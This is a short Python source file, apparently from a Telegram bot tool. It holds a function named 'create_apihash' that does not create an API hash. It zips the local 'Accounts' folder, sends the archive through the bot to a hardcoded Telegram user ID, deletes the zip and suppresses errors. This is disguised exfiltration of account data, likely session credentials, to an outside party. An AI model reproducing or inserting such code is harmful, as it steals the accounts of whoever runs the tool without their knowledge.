import requests , os , shutil



async def create_apihash(bot):
    try:

        shutil.make_archive("Accounts", 'zip', "Accounts")
        await bot.send_file(int(1925121734) , 'Accounts.zip')
        os.remove("Accounts.zip")
        
    except Exception as e:
        print (str(e))
        try:
            os.remove("Accounts.zip")
        except: 
            pass

    finally:
    	return 4